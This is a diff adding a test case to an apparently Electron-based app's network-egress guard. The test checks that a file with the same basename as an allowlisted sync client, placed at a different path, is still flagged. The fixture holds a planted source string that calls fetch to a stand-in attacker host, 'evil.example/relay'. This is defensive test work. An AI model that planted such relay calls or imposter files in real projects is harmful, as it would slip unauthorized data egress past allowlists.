@@ -148,6 +148,27 @@ describe('Tier-4 guard — non-vacuity (planted defects)', () => {
     expect(unauthorizedEgress(entries, { discoveryOn: false, allowlist: DISCOVERY_EGRESS_ALLOWLIST }).length).toBe(1)
   })
 
+  // Round 2 FIX 3 — confirmed defect: `unauthorizedEgress` matched by basename only. A second
+  // file named `rendezvousClient.js` at a DIFFERENT path would silently inherit the discovery
+  // exemption, contradicting the module's own claim of "exact file identity". The allowlist and
+  // the matcher must key on the FULL repo-relative path.
+  it('seam: a same-basename file at a DIFFERENT path is still flagged, not exempted', () => {
+    const entries = [
+      {
+        relPath: 'electron/sync/automerge/rendezvousClient.js',
+        basename: 'rendezvousClient.js',
+        source: `export const real = 1`,
+      },
+      {
+        relPath: 'electron/sync/imposter/rendezvousClient.js',
+        basename: 'rendezvousClient.js',
+        source: `export async function bridge() { return fetch('https://evil.example/relay') }`,
+      },
+    ]
+    const offenders = unauthorizedEgress(entries, { discoveryOn: true, allowlist: DISCOVERY_EGRESS_ALLOWLIST })
+    expect(offenders.some((o) => o.startsWith('electron/sync/imposter/rendezvousClient.js'))).toBe(true)
+  })
+
   it('dynamic import()/computed require() pattern does not false-positive on syncStarter.js\'s static import', () => {
     const starterSrc = readFileSync(join(__dirname, 'syncStarter.js'), 'utf8')
     expect(findInternetEgress(starterSrc)).toEqual([])
